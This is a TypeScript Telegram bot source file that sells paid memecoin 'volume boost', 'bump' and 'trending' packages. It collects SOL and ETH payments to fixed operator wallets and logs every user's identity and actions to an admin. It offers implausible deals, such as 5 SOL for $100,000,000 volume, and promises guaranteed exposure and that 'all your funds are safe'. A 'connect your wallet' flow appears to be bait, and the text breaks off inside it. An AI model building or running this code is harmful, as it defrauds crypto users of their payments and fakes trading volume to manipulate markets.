import path from "path";
import { fileURLToPath } from "url";
import { randomUUID } from "crypto";
import { Telegraf } from "telegraf";
import { notifyAdmin, setBot } from "./admin.js";
import { getSession, setSession, clearSession, getAllSessions } from "./sessions.js";
import { deriveWalletForUser } from "./wallet.js";
import { fetchTokenInfo, isValidCA, detectCAChain } from "./tokenInfo.js";
import { saveOrder, updateOrder, getAllOrders } from "./orders.js";
import { detectChain, verifyTx, isHashUsed, markHashUsed } from "./txVerify.js";
import { logger } from "../lib/logger.js";
import {
  mainMenuKeyboard,
  solPickerKeyboard,
  confirmOrderKeyboard,
  paymentSentKeyboard,
  cancelKeyboard,
  volumeBoostKeyboard,
  trendingMenuKeyboard,
  solTrendingKeyboard,
  ethTrendingKeyboard,
  pumpfunTrendingKeyboard,
  dexscreenerKeyboard,
  depositKeyboard,
  connectWalletKeyboard,
  securityGuidelinesKeyboard,
  howToConnectKeyboard,
  whyConnectKeyboard,
  mainMenuOnlyKeyboard,
} from "./keyboards.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);

const IMG = {
  welcome:       path.join(__dirname, "images", "welcome.jpeg"),
  walletconnect: path.join(__dirname, "images", "walletconnect.jpeg"),
  volume:        path.join(__dirname, "images", "volume.jpeg"),
  trending:      path.join(__dirname, "images", "trending.jpeg"),
};

// ── Payment addresses from environment only ────────────────────────────────────
const ETH_ADDRESS = process.env.PAYMENT_ETH_ADDRESS ?? "";
const SOL_ADDRESS = process.env.PAYMENT_SOL_ADDRESS ?? "";

// ── Delete the current message (the one that triggered a button click) ─────────
async function delMsg(ctx: any) {
  try { await ctx.deleteMessage(); } catch {}
}

// ── Send photo; fallback to text if photo fails ────────────────────────────────
async function sendPhoto(ctx: any, img: string, caption: string, extra: any = {}) {
  try {
    await ctx.replyWithPhoto({ source: img }, { caption, parse_mode: "HTML", ...extra });
  } catch {
    await ctx.reply(caption, { parse_mode: "HTML", ...extra });
  }
}

// ── Bot's own public base URL (for token image proxy) ─────────────────────────
const BOT_SERVER_BASE =
  process.env["RENDER_EXTERNAL_HOSTNAME"] ? `https://${process.env["RENDER_EXTERNAL_HOSTNAME"]}` :
  process.env["REPLIT_DEV_DOMAIN"]        ? `https://${process.env["REPLIT_DEV_DOMAIN"]}` :
  null;

function proxyImgUrl(raw: string): string | null {
  if (!raw || !BOT_SERVER_BASE) return null;
  return `${BOT_SERVER_BASE}/api/img?url=${encodeURIComponent(raw)}`;
}

async function safeSendPhoto(ctx: any, url: string, opts: any): Promise<boolean> {
  try { await ctx.replyWithPhoto(url, opts); return true; } catch {}
  const proxied = proxyImgUrl(url);
  if (proxied) {
    try { await ctx.replyWithPhoto(proxied, opts); return true; } catch {}
  }
  return false;
}

// ── User display helper ───────────────────────────────────────────────────────
function userLine(u: any): string {
  const name   = `${u.first_name ?? ""}${u.last_name ? " " + u.last_name : ""}`.trim();
  const handle = u.username ? ` (@${u.username})` : "";
  const lang   = u.language_code ? ` 🌐 ${u.language_code}` : "";
  return `👤 <b>${name}</b>${handle}${lang}\n🆔 ID: <code>${u.id}</code>`;
}

// ── Admin DM notifications ────────────────────────────────────────────────────
async function notifyNewUser(ctx: any) {
  await notifyAdmin(
    `🆕 <b>NEW USER STARTED BOT</b>\n\n` +
    `${userLine(ctx.from)}\n` +
    `⏰ ${new Date().toUTCString()}`
  );
}

async function notifyServiceSelected(ctx: any, service: string, pkg: string, amount: string) {
  await notifyAdmin(
    `🎯 <b>SERVICE SELECTED</b>\n\n` +
    `${userLine(ctx.from)}\n\n` +
    `📦 Service: <b>${service}</b>\n` +
    `💰 Package: <b>${pkg}</b>\n` +
    `💵 Amount: <b>${amount}</b>\n\n` +
    `⏰ ${new Date().toUTCString()}`
  );
}

async function notifyWalletViewed(ctx: any, solAddr: string, ethAddr: string) {
  await notifyAdmin(
    `👁 <b>DEPOSIT SCREEN OPENED</b>\n\n` +
    `${userLine(ctx.from)}\n\n` +
    `◎ SOL Wallet:\n<code>${solAddr}</code>\n\n` +
    `Ξ ETH Address:\n<code>${ethAddr || "Not configured"}</code>\n\n` +
    `⏰ ${new Date().toUTCString()}`
  );
}

async function notifyConnectWalletOpened(ctx: any) {
  await notifyAdmin(
    `🔗 <b>CONNECT WALLET OPENED</b>\n\n` +
    `${userLine(ctx.from)}\n\n` +
    `⏰ ${new Date().toUTCString()}`
  );
}

// ── Package tables ────────────────────────────────────────────────────────────
interface VolPkg { label: string; sol: number; volume: string; service: string }
const VOLUME_PKGS: Record<string, VolPkg> = {
  vol_iron:     { label: "Iron",     sol: 1.50,  volume: "$50,000",       service: "Iron Package"     },
  vol_bronze:   { label: "Bronze",   sol: 2.50,  volume: "$250,000",      service: "Bronze Package"   },
  vol_silver:   { label: "Silver",   sol: 5.00,  volume: "$100,000,000",  service: "Silver Package"   },
  vol_gold:     { label: "Gold",     sol: 3.50,  volume: "$100,000",      service: "Gold Package"     },
  vol_platinum: { label: "Platinum", sol: 7.50,  volume: "$500,000",      service: "Platinum Package" },
  vol_diamond:  { label: "Diamond",  sol: 10.50, volume: "$2,500,000",    service: "Diamond Package"  },
};

interface TrendPkg { label: string; sol: number; service: string }
const SOL_TREND_PKGS: Record<string, TrendPkg> = {
  st_top3_3hr:   { label: "TOP 3 — 3 hr",   sol: 1.50, service: "SOL Trending TOP3 3hr"   },
  st_top3_6hr:   { label: "TOP 3 — 6 hr",   sol: 2.30, service: "SOL Trending TOP3 6hr"   },
  st_top3_12hr:  { label: "TOP 3 — 12 hr",  sol: 3.70, service: "SOL Trending TOP3 12hr"  },
  st_top3_24hr:  { label: "TOP 3 — 24 hr",  sol: 5.90, service: "SOL Trending TOP3 24hr"  },
  st_top10_3hr:  { label: "TOP 10 — 3 hr",  sol: 1.00, service: "SOL Trending TOP10 3hr"  },
  st_top10_6hr:  { label: "TOP 10 — 6 hr",  sol: 1.60, service: "SOL Trending TOP10 6hr"  },
  st_top10_12hr: { label: "TOP 10 — 12 hr", sol: 2.60, service: "SOL Trending TOP10 12hr" },
  st_top10_24hr: { label: "TOP 10 — 24 hr", sol: 4.10, service: "SOL Trending TOP10 24hr" },
};

const ETH_TREND_PKGS: Record<string, { usd: number; service: string }> = {
  et_100: { usd: 100, service: "ETH Trending $100" },
  et_200: { usd: 200, service: "ETH Trending $200" },
  et_300: { usd: 300, service: "ETH Trending $300" },
};

const DEX_PKGS: Record<string, TrendPkg> = {
  dex_5hr:  { label: "TOP 6 — 5 hr",  sol: 2,   service: "DexScreener TOP6 5hr"  },
  dex_7hr:  { label: "TOP 6 — 7 hr",  sol: 3.5, service: "DexScreener TOP6 7hr"  },
  dex_12hr: { label: "TOP 6 — 12 hr", sol: 7,   service: "DexScreener TOP6 12hr" },
  dex_18hr: { label: "TOP 6 — 18 hr", sol: 10,  service: "DexScreener TOP6 18hr" },
  dex_24hr: { label: "TOP 6 — 24 hr", sol: 15,  service: "DexScreener TOP6 24hr" },
  dex_32hr: { label: "TOP 6 — 32 hr", sol: 22,  service: "DexScreener TOP6 32hr" },
};

// ─────────────────────────────────────────────────────────────────────────────
// SCREEN SENDERS — every screen deletes the old message then sends fresh content
// so the correct image always shows for its screen position.
// ─────────────────────────────────────────────────────────────────────────────

async function sendWelcome(ctx: any) {
  // delete the message that triggered navigation (if from a button click)
  await delMsg(ctx);
  const caption =
    `🟢 <b>Welcome to PUMPFUN TREND BOT service!</b>\n\n` +
    `New to volume bots? No worries — we made it super simple!\n\n` +
    `━━━━━━━━━━━━━━━━\n\n` +
    `<b>How it works:</b>\n` +
    `1. Select how much Bumps/volume to use.\n` +
    `2. Pick how long to run and how Massive you want your Token to Pump.\n` +
    `3. Done! <a href="https://pump.fun">Pump.fun</a> Server handles the rest.\n\n` +
    `━━━━━━━━━━━━━━━━\n\n` +
    `<b>Works on:</b>\n` +
    `🟢 <a href="https://pump.fun">Pumpfun</a>  •  🟢 <a href="https://raydium.io">Raydium</a>  •\n` +
    `🟢 <a href="https://pumpswap.xyz">PumpSwap</a>  •  🟢 <a href="https://moonshot.money">Moonshot</a>  •\n` +
    `🟢 <a href="https://letsbonk.fun">LetsBonk</a>  •  🟢 <a href="https://dexscreener.com">Dexpad/screener</a>\n\n` +
    `From 0.3 - 0.4 - 0.5 - 0.6 SOL bumps boost trend with mass volume of high stabilities.`;
  await sendPhoto(ctx, IMG.welcome, caption, mainMenuKeyboard);
}

async function showStartBumping(ctx: any) {
  await delMsg(ctx);
  await ctx.reply(
    `The fastest and cheapest Telegram bot for creating bump orders.\n\n` +
    `<b>Supported Platform:</b>\n` +
    `Pumpfun and Raydium.\n\n` +
    `Pumpfun BumpBot charges a one-time fee of <b>0.3 SOL</b> per token, making it the cheapest bump bot ever!\n\n` +
    `📊 <b>Trending channel:</b>\n` +
    `<a href="https://t.me/pumpmints">https://t.me/pumpmints</a>\n\n` +
    `Subscribe to our PF alert tools:\n` +
    `- PF New Raydium Pools: <a href="https://t.me/pumpswap_pools">t.me/pumpswap_pools</a>`,
    { parse_mode: "HTML", ...solPickerKeyboard }
  );
}

async function showVolumeBoost(ctx: any) {
  await delMsg(ctx);
  const caption =
    `✏️ Iron Package - $50,000 Volume\n` +
    `✏️ Bronze Package - $250,000 Volume\n` +
    `✏️ Silver Package - $100,000,000 Volume\n` +
    `✏️ Gold Package - $100,000 Volume\n` +
    `✏️ Platinum Package - $500,000 Volume\n` +
    `✏️ Diamond Package - $2,500,000 Volume\n\n` +
    `Please select the package below:`;
  await sendPhoto(ctx, IMG.volume, caption, volumeBoostKeyboard);
}

async function showTrendingBoost(ctx: any) {
  await delMsg(ctx);
  const caption =
    `🟢 Discover the Power of Trending!\n\n` +
    `Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n` +
    `🟢 A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n` +
    `➡️ Please choose SOL Trending or Pump Fun Trending to start:`;
  await sendPhoto(ctx, IMG.trending, caption, trendingMenuKeyboard);
}

async function showDexScreener(ctx: any) {
  await delMsg(ctx);
  await ctx.reply(
    `🌐 DEX Screener is a data platform and on-chain analytics tool designed for decentralized exchanges (DEXs), providing real-time insights into token prices, liquidity pools, trading volumes, and market trends across multiple blockchains.\n\n` +
    `<b>TREND ON DEX</b>\n\n` +
    `🔴 TOP 6 🔴\n\n` +
    `Select a duration:`,
    { parse_mode: "HTML", ...dexscreenerKeyboard }
  );
}

// ── Fetch real SOL balance from mainnet RPC ────────────────────────────────────
async function fetchSolBalance(address: string): Promise<string> {
  try {
    const resp = await fetch("https://api.mainnet-beta.solana.com", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        jsonrpc: "2.0", id: 1,
        method: "getBalance",
        params: [address, { commitment: "confirmed" }],
      }),
      signal: AbortSignal.timeout(6000),
    });
    const data: any = await resp.json();
    const lamports = data?.result?.value ?? 0;
    return `${(lamports / 1e9).toFixed(4)} SOL`;
  } catch {
    return "unavailable";
  }
}

async function showDeposit(ctx: any) {
  await delMsg(ctx);
  const solDisplay = SOL_ADDRESS || "Not configured — set PAYMENT_SOL_ADDRESS";
  const ethDisplay = ETH_ADDRESS || "Not configured — set PAYMENT_ETH_ADDRESS";
  const solBal     = SOL_ADDRESS ? await fetchSolBalance(SOL_ADDRESS) : "N/A";
  await ctx.reply(
    `<b>PAYMENT WALLETS</b>\n\n` +
    `<b>SOL:</b>\n<code>${solDisplay}</code>\n` +
    `balance: <b>${solBal}</b>\n\n` +
    `<b>ETH:</b>\n<code>${ethDisplay}</code>\n\n` +
    `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
    `💰 Send payment to the wallet address above.\n` +
    `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
    { parse_mode: "HTML", ...depositKeyboard }
  );
  notifyWalletViewed(ctx, solDisplay, ETH_ADDRESS).catch(() => {});
}

async function showConnectWallet(ctx: any) {
  await delMsg(ctx);
  const caption =
    `🔗 <b>Connect Your Wallet</b>\n\n` +
    `Welcome to our secure wallet connection service!\n\n` +
    `Connect your wallet to unlock premium features and enhanced trading capabilities.\n\n` +
    `<b>Available Options:</b>\n` +
    `🔗 Connect Now - Start the connection process\n` +
    `🔐 Why Connect? - Learn about the benefits\n` +
    `🛡️ Security Guidelines - Important safety information\n` +
    `📱 How to Connect - Step-by-step instructions\n\n` +
    `Your security is our top priority. We use industry-standard encryption to protect your information.`;
  await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
}


// ── Bot factory ───────────────────────────────────────────────────────────────
export function createBot(): Telegraf {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) throw new Error("TELEGRAM_BOT_TOKEN not set");
  const bot = new Telegraf(token);
  setBot(bot);

  bot.catch((err: unknown, ctx: any) => {
    const msg = err instanceof Error ? err.message : String(err);
    logger.error({ err, updateType: ctx?.updateType }, `Bot error: ${msg}`);
    ctx?.answerCbQuery?.("⚠️ Something went wrong. Please try again.").catch(() => {});
    ctx?.reply?.("⚠️ Something went wrong. Please use /start to restart.").catch(() => {});
  });

  // ── /start ────────────────────────────────────────────────────────────────
  bot.start(async (ctx) => {
    clearSession(ctx.from.id);
    notifyNewUser(ctx).catch(() => {});
    // /start has no previous bot message to delete — just send fresh welcome
    await sendPhoto(ctx, IMG.welcome,
      `🟢 <b>Welcome to PUMPFUN TREND BOT service!</b>\n\n` +
      `New to volume bots? No worries — we made it super simple!\n\n` +
      `━━━━━━━━━━━━━━━━\n\n` +
      `<b>How it works:</b>\n` +
      `1. Select how much Bumps/volume to use.\n` +
      `2. Pick how long to run and how Massive you want your Token to Pump.\n` +
      `3. Done! <a href="https://pump.fun">Pump.fun</a> Server handles the rest.\n\n` +
      `━━━━━━━━━━━━━━━━\n\n` +
      `<b>Works on:</b>\n` +
      `🟢 <a href="https://pump.fun">Pumpfun</a>  •  🟢 <a href="https://raydium.io">Raydium</a>  •\n` +
      `🟢 <a href="https://pumpswap.xyz">PumpSwap</a>  •  🟢 <a href="https://moonshot.money">Moonshot</a>  •\n` +
      `🟢 <a href="https://letsbonk.fun">LetsBonk</a>  •  🟢 <a href="https://dexscreener.com">Dexpad/screener</a>\n\n` +
      `From 0.3 - 0.4 - 0.5 - 0.6 SOL bumps boost trend with mass volume of high stabilities.`,
      mainMenuKeyboard
    );
  });

  // ── Main menu ─────────────────────────────────────────────────────────────
  bot.action("back_main", async (ctx) => {
    await ctx.answerCbQuery();
    clearSession(ctx.from.id);
    await sendWelcome(ctx);
  });

  bot.action("menu_bump",     async (ctx) => { await ctx.answerCbQuery(); await showStartBumping(ctx); });
  bot.action("menu_volume",   async (ctx) => { await ctx.answerCbQuery(); await showVolumeBoost(ctx); });
  bot.action("menu_trending", async (ctx) => { await ctx.answerCbQuery(); await showTrendingBoost(ctx); });
  bot.action("menu_dex",      async (ctx) => { await ctx.answerCbQuery(); await showDexScreener(ctx); });
  bot.action("menu_deposit",  async (ctx) => { await ctx.answerCbQuery(); await showDeposit(ctx); });
  // menu_support: URL button when SUPPORT_USERNAME is set; safe fallback for old messages
  bot.action("menu_support", async (ctx) => {
    await ctx.answerCbQuery();
    const handle = (process.env.SUPPORT_USERNAME ?? "").replace(/^@/, "");
    if (handle) {
      await delMsg(ctx);
      await ctx.reply(
        `💬 <b>Contact Support</b>\n\nTap to open chat: <a href="https://t.me/${handle}">@${handle}</a>`,
        { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
      );
    } else {
      await ctx.answerCbQuery("Support not configured yet.");
    }
  });

  bot.action("menu_wallet", async (ctx) => {
    await ctx.answerCbQuery();
    notifyConnectWalletOpened(ctx).catch(() => {});
    await showConnectWallet(ctx);
  });

  // ── SOL bump amount picker ────────────────────────────────────────────────
  for (const amt of ["0.3", "0.4", "0.5", "0.6"]) {
    bot.action(`sol_${amt}`, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "Volume Bumping", `${amt} SOL per bump`, `${amt} SOL`).catch(() => {});
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: parseFloat(amt),
        serviceLabel: `Volume Bumping (${amt} SOL)`,
        boostType: "bump",
      });
      await delMsg(ctx);
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected <b>${amt} SOL</b> per bump\n\n` +
        `Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── Volume Boost packages ─────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(VOLUME_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "Volume Boost", `${pkg.service} — ${pkg.volume}`, `${pkg.sol} SOL`).catch(() => {});
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "volume",
        boostPackage: key,
      });
      await delMsg(ctx);
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `You selected <b>${pkg.label} Package (${pkg.sol} SOL)</b>\n` +
        `Volume: <b>${pkg.volume}</b>\n\n` +
        `Please enter the Contract Address (CA) of your project:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── Trending menu ─────────────────────────────────────────────────────────
  bot.action("trend_sol", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(
      `Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n` +
      `🟢 A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n` +
      `➡️ Please choose SOL Trending or Pump Fun Trending to start:`,
      { parse_mode: "HTML", ...solTrendingKeyboard }
    );
  });

  bot.action("trend_eth", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(
      `🔵 <b>ETH TREND</b>\n\nKindly chose the trend you wish to pump on.`,
      { parse_mode: "HTML", ...ethTrendingKeyboard }
    );
  });

  bot.action("trend_pumpfun", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await sendPhoto(ctx, IMG.trending,
      `🔥 <b>PUMP.FUN TRENDING</b> 🔥\n\n` +
      `💡 THE BEST TRENDING IN THE BOT SECTION, DON'T MISS THE OPPORTUNITY TO GET 12 HOURS FREE SOLANA TRENDING ONCE YOU PURCHASE IT.`,
      pumpfunTrendingKeyboard
    );
  });

  bot.action("trend_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showTrendingBoost(ctx);
  });

  bot.action("st_top3_label",  async (ctx) => ctx.answerCbQuery("TOP 3 — left column"));
  bot.action("st_top10_label", async (ctx) => ctx.answerCbQuery("TOP 10 — right column"));

  // ── SOL trending packages ─────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(SOL_TREND_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "SOL Trending Boost", pkg.service, `${pkg.sol} SOL`).catch(() => {});
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "sol_trending",
        boostPackage: key,
      });
      await delMsg(ctx);
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `Package: <b>${pkg.label}</b>\n` +
        `Cost: <b>${pkg.sol} SOL</b>\n\n` +
        `Please paste the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── ETH trending packages ─────────────────────────────────────────────────
  for (const [key, pkg] of Object.entries(ETH_TREND_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "ETH Trending Boost", pkg.service, `$${pkg.usd} USD`).catch(() => {});
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: 0,
        ethAmount: pkg.usd,
        serviceLabel: pkg.service,
        boostType: "eth_trending",
        boostPackage: key,
      });
      await delMsg(ctx);
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `Package: <b>ETH Trending $${pkg.usd}</b>\n\n` +
        `Please paste the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── PumpFun trending ──────────────────────────────────────────────────────
  bot.action("pft_30", async (ctx) => {
    await ctx.answerCbQuery();
    notifyServiceSelected(ctx, "PumpFun Trending", "P.F.T — 30 SOL", "30 SOL").catch(() => {});
    setSession(ctx.from.id, {
      step: "awaiting_ca",
      selectedSol: 30,
      serviceLabel: "PumpFun Trending P.F.T",
      boostType: "pumpfun_trending",
      boostPackage: "pft_30",
    });
    await delMsg(ctx);
    await ctx.reply(
      `📝 <b>Enter Contract Address (CA)</b>\n\n` +
      `Package: <b>P.F.T — 30 SOL</b>\n\n` +
      `Please paste the Contract Address (CA) of your token:`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });

  // ── DexScreener ───────────────────────────────────────────────────────────
  bot.action("dex_top6_info", async (ctx) => ctx.answerCbQuery("Choose a duration below"));

  for (const [key, pkg] of Object.entries(DEX_PKGS)) {
    bot.action(key, async (ctx) => {
      await ctx.answerCbQuery();
      notifyServiceSelected(ctx, "DexScreener Boost", pkg.service, `${pkg.sol} SOL`).catch(() => {});
      setSession(ctx.from.id, {
        step: "awaiting_ca",
        selectedSol: pkg.sol,
        serviceLabel: pkg.service,
        boostType: "dexscreener",
        boostPackage: key,
      });
      await delMsg(ctx);
      await ctx.reply(
        `📝 <b>Enter Contract Address (CA)</b>\n\n` +
        `Package: <b>${pkg.label}</b>\n` +
        `Cost: <b>${pkg.sol} SOL</b>\n\n` +
        `Please paste the Contract Address (CA) of your token:`,
        { parse_mode: "HTML", ...cancelKeyboard }
      );
    });
  }

  // ── Confirm order ─────────────────────────────────────────────────────────
  bot.action("confirm_bump", async (ctx) => {
    await ctx.answerCbQuery();
    const s       = getSession(ctx.from.id);
    const orderId = randomUUID().split("-")[0].toUpperCase();
    const isEth   = s.boostType === "eth_trending";

    // Both SOL and ETH use fixed env payment addresses
    const payWallet = isEth ? ETH_ADDRESS : SOL_ADDRESS;

    setSession(ctx.from.id, {
      step: "awaiting_payment_sent",
      paymentWallet: payWallet,
      orderId,
    });

    saveOrder({
      id:              orderId,
      userId:          ctx.from.id,
      userName:        `${ctx.from.first_name ?? ""}${ctx.from.last_name ? " " + ctx.from.last_name : ""}`,
      userHandle:      ctx.from.username ?? "",
      tokenName:       s.tokenName    ?? "Unknown",
      tokenSymbol:     s.tokenSymbol  ?? "???",
      contractAddress: s.contractAddress ?? "",
      service:         s.serviceLabel ?? "Boost",
      solAmount:       s.selectedSol  ?? 0,
      usdAmount:       s.ethAmount,
      paymentWallet:   payWallet,
      status:          "pending",
      createdAt:       new Date(),
    });

    const chainLabel = s.tokenChain === "sol" ? "◎ Solana"
                     : s.tokenChain === "eth" ? "Ξ Ethereum"
                     : s.tokenChain === "bsc" ? "⬡ BSC"
                     : s.tokenChain === "base" ? "🔵 Base"
                     : "🔗";

    const payLine = isEth
      ? `Ξ <b>$${s.ethAmount} USD</b>\n📮 ETH Wallet:\n<code>${ETH_ADDRESS || "Contact support for ETH address"}</code>`
      : `◎ <b>${s.selectedSol} SOL</b>\n📮 SOL Wallet:\n<code>${SOL_ADDRESS || "Contact support for SOL address"}</code>`;

    const paymentMsg =
      `✅ <b>Order Confirmed!</b>\n\n` +
      `📋 <b>Order Details:</b>\n` +
      `• Token: <b>${s.tokenName}</b> ($${s.tokenSymbol})\n` +
      `• CA: <code>${s.contractAddress}</code>\n` +
      `• Service: ${s.serviceLabel}\n` +
      (isEth ? `• Amount: <b>$${s.ethAmount} USD</b>\n` : `• Amount: <b>${s.selectedSol} SOL</b>\n`) +
      `• Order ID: <code>${orderId}</code>\n\n` +
      `💳 <b>Send Payment To:</b>\n` +
      `${payLine}\n\n` +
      (isEth
        ? `⚠️ Send exactly <b>$${s.ethAmount} USD</b> on Ethereum network`
        : `⚠️ Send exactly <b>${s.selectedSol} SOL</b> on Solana network`) +
      `\n\nAfter sending, click the button below and submit your transaction hash.`;

    await delMsg(ctx);

    // Show payment screen with token image if available
    let sentWithPhoto = false;
    if (s.tokenImageUrl) {
      sentWithPhoto = await safeSendPhoto(ctx, s.tokenImageUrl, {
        caption: paymentMsg,
        parse_mode: "HTML",
        ...paymentSentKeyboard,
      });
    }
    if (!sentWithPhoto) {
      await ctx.reply(paymentMsg, { parse_mode: "HTML", ...paymentSentKeyboard });
    }

    // ── Admin: full new order notification ─────────────────────────────────
    const adminMsg =
      `📋 <b>NEW ORDER</b>\n\n` +
      `${userLine(ctx.from)}\n\n` +
      `🪙 <b>${s.tokenName ?? "Unknown"} ($${s.tokenSymbol ?? "???"})</b>  ${chainLabel}\n` +
      `📍 CA: <code>${s.contractAddress}</code>\n` +
      (s.tokenPrice     ? `💵 Price: ${s.tokenPrice}\n`          : "") +
      (s.tokenMarketCap ? `📈 Market Cap: ${s.tokenMarketCap}\n` : "") +
      (s.tokenLiquidity ? `💧 Liq: ${s.tokenLiquidity}\n`        : "") +
      (s.tokenVolume24h ? `🔄 Vol 24h: ${s.tokenVolume24h}\n`    : "") +
      (s.tokenDex       ? `🏦 DEX: ${s.tokenDex}\n`             : "") +
      `\n⚙️ Service: <b>${s.serviceLabel}</b>\n` +
      `💰 Cost: <b>${isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}</b>\n` +
      `🆔 Order ID: <code>${orderId}</code>\n` +
      `📮 Pay to: <code>${payWallet}</code>\n\n` +
      `⏰ ${new Date().toUTCString()}`;

    if (s.tokenImageUrl) {
      try { await notifyAdmin(adminMsg, s.tokenImageUrl); }
      catch { await notifyAdmin(adminMsg); }
    } else {
      await notifyAdmin(adminMsg);
    }
  });

  // ── Payment sent → ask for TX hash ────────────────────────────────────────
  bot.action("submit_tx", async (ctx) => {
    await ctx.answerCbQuery();
    const s = getSession(ctx.from.id);
    setSession(ctx.from.id, { step: "awaiting_tx_hash" });
    await delMsg(ctx);
    await ctx.reply(
      `📝 <b>Submit Transaction Hash</b>\n\n` +
      `Please paste your transaction hash below.\n\n` +
      `🕐 Order ID: <code>${s.orderId ?? "N/A"}</code>`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });

  // ── Deposit actions ───────────────────────────────────────────────────────
  bot.action("deposit_add", async (ctx) => {
    await ctx.answerCbQuery("Fetching balance...");
    const solDisplay = SOL_ADDRESS || "Not configured — set PAYMENT_SOL_ADDRESS";
    const ethDisplay = ETH_ADDRESS || "Not configured — set PAYMENT_ETH_ADDRESS";
    const solBal     = SOL_ADDRESS ? await fetchSolBalance(SOL_ADDRESS) : "N/A";
    await delMsg(ctx);
    await ctx.reply(
      `<b>PAYMENT WALLETS</b>\n\n` +
      `<b>SOL:</b>\n<code>${solDisplay}</code>\n` +
      `balance: <b>${solBal}</b>\n\n` +
      `<b>ETH:</b>\n<code>${ethDisplay}</code>\n\n` +
      `Deposit not less than 0.30 SOL and get trending on several platforms\n\n` +
      `💰 Send payment to the wallet address above.\n` +
      `💡 NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });

  bot.action("deposit_withdraw", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_withdraw_address" });
    await delMsg(ctx);
    await ctx.reply(
      `💸 <b>Withdraw Funds</b>\n\n` +
      `Send your withdrawal address and amount:\n\n` +
      `<b>Format:</b> <code>ADDRESS AMOUNT</code>\n` +
      `<b>Example:</b> <code>7xKXtg2...GVUM 0.5</code>\n\n` +
      `⚠️ Double-check — withdrawals cannot be reversed.`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });

  bot.action("deposit_sol_balance", async (ctx) => {
    await ctx.answerCbQuery("Checking balance...");
    const solDisplay = SOL_ADDRESS || "Not configured";
    const balance    = SOL_ADDRESS ? await fetchSolBalance(SOL_ADDRESS) : "N/A";

    notifyAdmin(
      `💳 <b>BALANCE CHECK</b>\n\n` +
      `${userLine(ctx.from)}\n\n` +
      `◎ SOL Wallet: <code>${solDisplay}</code>\n` +
      `Balance: <b>${balance}</b>\n\n` +
      `⏰ ${new Date().toUTCString()}`
    ).catch(() => {});

    await delMsg(ctx);
    await ctx.reply(
      `◎ <b>SOL Balance</b>\n\n` +
      `Wallet: <code>${solDisplay}</code>\n\n` +
      `Balance: <b>${balance}</b>`,
      { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
    );
  });

  bot.action("deposit_my_deposits", async (ctx) => {
    await ctx.answerCbQuery();
    const orders = getAllOrders().filter(o => o.userId === ctx.from.id && o.status !== "cancelled");
    const lines = orders.length
      ? orders.map(o =>
          `• ${o.service} — ${o.solAmount > 0 ? o.solAmount + " SOL" : "$" + o.usdAmount + " USD"} — ${o.status} — ${o.createdAt.toLocaleDateString()}`
        ).join("\n")
      : "No orders yet.";
    await delMsg(ctx);
    await ctx.reply(`📋 <b>My Orders</b>\n\n${lines}`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
  });

  bot.action("deposit_my_withdrawals", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(`📋 <b>My Withdrawals</b>\n\nNo withdrawals recorded yet.`, { parse_mode: "HTML", ...mainMenuOnlyKeyboard });
  });

  // ── Connect Wallet sub-screens ────────────────────────────────────────────
  bot.action("wallet_back", async (ctx) => {
    await ctx.answerCbQuery();
    await showConnectWallet(ctx);
  });

  bot.action("wallet_why", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(
      `🔐 <b>Why Connect Your Wallet?</b>\n\n` +
